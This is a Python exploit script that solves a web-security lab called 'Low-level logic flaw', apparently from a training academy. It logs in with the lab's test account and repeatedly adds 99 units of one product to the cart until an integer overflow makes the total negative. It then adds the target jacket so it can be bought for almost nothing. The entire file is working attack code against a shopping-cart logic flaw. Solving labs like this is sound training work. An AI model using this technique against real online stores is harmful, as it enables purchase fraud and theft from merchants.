import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token


def get_total(response):
    r = response
    soup = BeautifulSoup(r.text, "html.parser")
    total_entry = soup.find("th", string="Total:").parent()[1]
    total_re = re.search(r"(\<th\>)([-$]{1,2})(\d+)", str(total_entry))
    status = total_re.group(2)
    total = float(total_re.group(3))
    return status, total


def make_order(s, url, product_id, quantity):
    params = {
        'productId' : product_id,
        'redir' : 'CART',
        'quantity' : quantity
    }
    r = s.post(url, data=params, verify=False, proxies=proxies)
    if r.status_code == 200:
        return r
    else:
        print("[-] Error!")
        sys.exit(-1)


def buy_jacket(s, url):
    # LOG-IN AS USER wiener
    print("[+] Logging-in as user wiener...")
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "wiener" in r.text:
        print("[+] Logged-in!")

        # ADD PRODUCTS TO CART
        cart_url = url + "/cart"
        i = 0
        while True:
            if i <= 323:
                product_id = 1
                quantity = 99
            else:
                product_id = 2
                quantity = 1
            status, total = get_total(make_order(s, cart_url, product_id, quantity))
            sys.stdout.write("[+] Current balance is {0}{1} and i is {2}\r".format(status, total, i))
            sys.stdout.flush()
            i += 1
            if total > 0 and total < 99:
                break
            sys.stdout.write("\033[K")
        print("\n[+] The jacket is all yours! Enjoy it... or them!")

            

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s wwww.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()


    print("[+] Lab: Low-level logic flaw")
    print("""[+] This lab doesn't adequately validate user input.
    You can exploit a logic flaw in its purchasing workflow to buy it  ems for an unintended price.
    To solve the lab, buy a "Lightweight l33t leather jacket".

    You can log in to your own account using the following credentials: wiener:peter""")
    
    buy_jacket(s, url)



if __name__ == "__main__":
    main()